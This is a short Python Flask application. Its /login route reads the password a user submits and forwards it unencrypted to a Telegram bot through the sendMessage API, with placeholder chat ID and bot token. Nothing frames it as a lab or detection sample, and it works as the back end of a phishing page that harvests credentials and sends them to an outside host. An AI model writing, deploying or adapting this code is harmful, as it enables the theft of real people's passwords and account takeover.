from flask import Flask, request
import requests
from Dsend import get 

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    password = request.form.get('password')
    chat_id = "YOUR_CHAT_ID"
    token = "YOUR_BOT_TOKEN"
    url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={password}"
    get(url,print_text=True)
    return "Password sent to Telegram"

if __name__ == "__main__":
    app.run(debug=True)
